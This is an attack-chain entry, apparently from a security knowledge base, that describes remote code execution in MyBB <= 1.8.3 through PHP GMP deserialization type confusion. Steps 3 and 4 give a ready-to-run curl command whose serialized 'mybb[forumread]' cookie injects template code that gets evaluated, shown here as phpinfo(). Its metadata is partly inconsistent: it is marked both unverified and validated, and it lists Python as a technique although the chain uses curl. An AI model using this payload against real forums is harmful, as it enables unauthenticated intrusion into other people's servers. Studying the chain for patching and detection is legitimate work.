---
id: ac-gmp-mybb-rce-001
tags:
  - deserialization
  - type-confusion
  - rce
  - php
  - mybb
  - gmp
type: attack_chain
tools:
  - '[[tools/curl]]'
tactics:
  - '[[Initial Access]]'
  - '[[Execution]]'
verified: false
platforms:
  - Web
  - PHP
submitted: true
complexity: medium
created_at: '2023-10-01T00:00:00Z'
procedures:
  - '[[procedures/Analyze-PHP-GMP-Unserialize-for-Type-Confusion]]'
  - '[[procedures/Craft-GMP-Payload-for-Object-Property-Manipulation]]'
  - '[[procedures/Inject-Malicious-Cookie-into-MyBB-Forumread]]'
  - '[[procedures/Trigger-RCE-via-MyBB-Index-Page-Access]]'
step_count: 4
techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[Python]]'
updated_at: '2025-12-14T17:23:54.840Z'
description: >-
  A multi-stage attack exploiting PHP GMP deserialization type confusion to
  achieve remote code execution in MyBB by injecting malicious serialized
  payloads via cookies.
skill_level: intermediate
impact_level: high
validated: true
mitre_tactics:
  - '[[Initial Access]]'
  - '[[Execution]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[Python]]'
---
# GMP Deserialization Type Confusion Leading to RCE in MyBB via Cookie Injection

Multi-stage attack chain demonstrating exploitation of PHP's GMP extension type confusion during deserialization to manipulate object properties and achieve remote code execution in MyBB versions <= 1.8.3.

## Chain Metrics Dashboard

| Metric | Value |
|--------|-------|
| Chain Status | Unverified |
| Total Steps | 4 |
| Execution Time | ~5 minutes |
| Skill Level | Intermediate |
| Complexity | Medium |
| Impact Level | High |

## Attack Flow Visualization

```mermaid
graph LR
    A[Analyze GMP Source] --> B[Craft Payload]
    B --> C[Inject Cookie]
    C --> D[Trigger RCE]

    style A fill:#e74c3c
    style B fill:#f39c12
    style C fill:#3498db
    style D fill:#27ae60
```

## Prerequisites & Requirements

### Required Tools

- [[tools/curl]]

### Target Environment

- Web platform with PHP 5.6 < 5.6.30
- MyBB <= 1.8.3
- Services: MySQL, SQLite, or PostgreSQL
- Network access: Direct HTTP access to MyBB index.php

### Initial Access Requirements

- No credentials required
- Attacker must be able to send HTTP requests to the target
- Vulnerable PHP GMP extension enabled

## Detailed Attack Procedures

### Step 1: Analyze PHP GMP Deserialization
procedure: [[procedures/Analyze-PHP-GMP-Unserialize-for-Type-Confusion]]

**Objective**: Examine PHP source code to identify type confusion in GMP unserialization that allows property manipulation.

**Instructions**: Review the gmp_unserialize function in PHP source, focusing on how it copies properties via zend_hash_copy without validating ZVAL type changes from __wakeup().

**Expected Output**: Understanding of how GMP object conversion to integer ZVAL enables access to global object store.

**Success Indicators**:
- Identification of zend_hash_copy vulnerability
- Confirmation of type confusion via __wakeup alterations

### Step 2: Craft Serialized Payload
procedure: [[procedures/Craft-GMP-Payload-for-Object-Property-Manipulation]]

**Objective**: Create a serialized GMP payload that exploits type confusion to set the templates cache property for code injection.

**Instructions**: Use PHP to build a serialized string with a GMP object containing an inner DateInterval that casts to integer handle 5 (for templates object), injecting PHP code like '{${phpinfo()}}' into the 'index' template cache.

**Expected Output**: Valid serialized payload ready for cookie injection.

**Success Indicators**:
- Payload unserializes without errors
- Property manipulation confirmed in test environment

### Step 3: Inject Malicious Cookie
procedure: [[procedures/Inject-Malicious-Cookie-into-MyBB-Forumread]]

**Objective**: Send the crafted payload via the 'mybb[forumread]' cookie to the MyBB application.

**Instructions**: Execute [[commands/mybb-rce-curl-exploit]] to set the cookie:

```bash
curl --cookie 'mybb[forumread]=a:1:{i:0;C:3:"GMP":106:{s:1:"5";a:2:{s:5:"cache";a:1:{s:5:"index";s:14:"{${phpinfo()}}";}i:0;O:12:"DateInterval":1:{s:1:"y";R:2;}}}}' http://127.0.0.1/mybb/
```

**Expected Output**: HTTP response from MyBB index.php with the cookie set.

**Success Indicators**:
- Cookie accepted by server
- No deserialization errors in logs

### Step 4: Trigger Deserialization and RCE
procedure: [[procedures/Trigger-RCE-via-MyBB-Index-Page-Access]]

**Objective**: Access the index page to trigger deserialization, property modification, and eval execution of injected code.

**Instructions**: Re-execute [[commands/mybb-rce-curl-exploit]] to access the page:

```bash
curl --cookie 'mybb[forumread]=a:1:{i:0;C:3:"GMP":106:{s:1:"5";a:2:{s:5:"cache";a:1:{s:5:"index";s:14:"{${phpinfo()}}";}i:0;O:12:"DateInterval":1:{s:1:"y";R:2;}}}}' http://127.0.0.1/mybb/
```

**Expected Output**: Page output including phpinfo() execution from the injected template code.

**Success Indicators**:
- PHP code executes (e.g., phpinfo() output)
- Templates cache modified via type confusion

## Attack Chain Summary

### Key Achievements

1. Exploitation of PHP GMP type confusion for arbitrary object property updates
2. Injection of malicious serialized data via user-controlled cookie
3. Remote code execution in MyBB through eval in template parsing

## Technique & Tactic Coverage

### MITRE ATT&CK Techniques

- [[Exploit Public-Facing Application]]
- [[Python]]

### MITRE ATT&CK Tactics

- [[Initial Access]]
- [[Execution]]

---

*Last updated: 2023-10-01T00:00:00Z*
